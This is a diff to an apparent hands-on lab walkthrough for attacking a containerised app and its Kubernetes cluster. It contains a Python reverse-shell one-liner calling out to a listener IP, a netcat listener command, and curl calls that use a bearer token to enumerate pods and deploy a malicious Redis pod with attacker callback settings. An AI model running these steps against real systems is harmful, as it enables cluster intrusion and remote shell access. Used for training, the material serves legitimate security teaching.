@@ -78,7 +78,7 @@ Server: nginx/1.11.13
 * you should be in the payloads directory. Open `reverse_shell.yml` with `atom reverse_shell.yml`
 * change the external IP address to your VM's IP address with ifconfig. Also make sure that port 1337 is available on your VM
     `["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.2.3\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]`
-* open a separate terminal and start your netcat listener.
+* open a separate terminal and start your netcat listener by running `nc -l 1337`
 * Now run:
 
 ```
@@ -114,9 +114,21 @@ Now you can interact with your target app and backend K8s cluster
 * Let's start interacting with K8s API
 
     `curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure`
+    
     `curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure`
 
-You should see a JSON Dump of all the pods running in the cluster at this time
+You should see a JSON Dump of all the pods and services running in the cluster at this time
+
+Note `clusterIP` of the `redis-service` Service.
+
+Open a new tab in terminal and launch a web-server by running `./tornado_server.py`
+
+Change the value of `MASTERHOST` with the value of `clusterIP`.
+
+Change the value of `LISTENER_IP` with the VM IP that can be fetched by running `ifconfig`
+
+Change the value of `LISTENER_PORT` to the port web-server is running on(`9090`)
+
 ```
 cat > mal-redis.json <<EOF
 {
@@ -139,11 +151,11 @@ cat > mal-redis.json <<EOF
                 "value": "6379"
               },
               {
-                "name": "LISTNER_IP",
+                "name": "LISTENER_IP",
                 "value": "192.168.2.116"
               },
               {
-                "name": "LISTNER_PORT",
+                "name": "LISTENER_PORT",
                 "value": "3999"
               }
             ]
@@ -154,4 +166,5 @@ EOF
 ```
 
 `curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d@mal-redis.json --insecure`
+
 `curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure`
